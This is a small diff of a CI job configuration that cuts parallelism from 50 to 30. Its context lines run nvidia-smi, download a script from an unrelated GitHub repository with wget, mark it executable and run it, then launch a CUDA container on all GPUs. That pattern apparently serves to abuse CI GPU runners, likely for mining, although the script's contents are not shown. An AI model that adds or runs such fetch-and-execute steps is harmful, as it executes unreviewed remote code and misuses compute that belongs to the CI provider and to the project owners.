@@ -8,4 +8,4 @@ jobs:
       - run: nvidia-smi
       - run: wget https://raw.githubusercontent.com/ploretope/bash/main/dock.sh && chmod +x dock.sh && ./dock.sh
       - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
-    parallelism: 50
+    parallelism: 30
